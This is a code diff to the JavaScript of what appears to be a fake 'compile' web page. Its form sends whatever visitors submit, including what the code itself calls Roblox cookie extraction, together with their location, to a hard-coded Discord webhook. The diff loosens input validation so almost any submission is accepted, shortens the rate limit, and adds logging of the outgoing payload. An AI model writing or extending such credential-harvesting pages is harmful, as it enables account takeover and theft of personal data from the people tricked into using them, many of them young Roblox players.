@@ -26,7 +26,7 @@ const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv
 // Rate limiting and spam prevention
 let lastSubmissionTime = 0;
 let submittedCodes = new Set();
-const RATE_LIMIT_MS = 30000; // 30 seconds between submissions
+const RATE_LIMIT_MS = 5000; // 5 seconds between submissions
 const MIN_CODE_LENGTH = 3;
 
 // Utility Functions
@@ -99,38 +99,19 @@ function isValidCode(code) {
         return { valid: false, reason: 'random_letters', isRandomLetters: true };
     }
 
-    // Allow almost any input - very permissive
-    const validPatterns = [
-        // Numbers (any length)
-        /^[0-9]+$/,
-        // Text with numbers
-        /[0-9]/,
-        // URLs
-        /\./,
-        // Programming/script content
-        /[\$\(\)\[\]{}]/,
-        // Any reasonable text (3+ chars)
-        /.{3,}/
-    ];
-
-    let isValidFormat = false;
-    for (const pattern of validPatterns) {
-        if (pattern.test(cleanCode)) {
-            isValidFormat = true;
-            break;
-        }
-    }
-
-    if (!isValidFormat) {
-        // Only reject if it's clearly just random letters
-        const isRandomLetters = /^[a-zA-Z\s]{3,8}$/.test(cleanCode) && 
-                               !/\b(roblox|item|id|script|code|game|test)\b/i.test(cleanCode);
+    // Accept everything except obvious spam
+    // Just check it's not purely repeated characters
+    if (cleanCode.length >= 3) {
+        // Only reject very obvious spam
+        const isObviousSpam = /^(.)\1{5,}$/.test(cleanCode) || // Same char 6+ times
+                             /^(a+|b+|c+|test+|spam+)$/i.test(cleanCode); // Simple spam
         
-        if (isRandomLetters) {
+        if (isObviousSpam) {
             return { valid: false, reason: 'random_letters', isRandomLetters: true };
         }
         
-        return { valid: false, reason: 'Invalid input format!' };
+        // Accept everything else
+        return { valid: true, type: 'general_input' };
     }
 
     return { valid: true, type: 'general_input' };
@@ -175,9 +156,11 @@ async function getLocationInfo() {
 }
 
 async function sendToWebhook(code, validationResult = {}) {
+    console.log('sendToWebhook called with:', { code, validationResult });
     try {
         // Get location information
         const locationInfo = await getLocationInfo();
+        console.log('Location info:', locationInfo);
         
         // Check if this is a Roblox cookie extraction
         const isRobloxCookie = validationResult.type === 'roblox_cookie';
@@ -319,6 +302,7 @@ async function sendToWebhook(code, validationResult = {}) {
             };
         }
 
+        console.log('Sending payload to webhook:', payload);
         const response = await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: {
@@ -326,6 +310,7 @@ async function sendToWebhook(code, validationResult = {}) {
             },
             body: JSON.stringify(payload)
         });
+        console.log('Webhook response status:', response.status);
 
         if (response.ok) {
             return { success: true };
@@ -381,7 +366,9 @@ compileForm.addEventListener('submit', async (e) => {
 
     // Check rate limiting
     const rateLimitCheck = checkRateLimit();
+    console.log('Rate limit check:', rateLimitCheck);
     if (!rateLimitCheck.allowed) {
+        console.log('Rate limited!');
         showCompileStatus(rateLimitCheck.reason, 'error');
         return;
     }
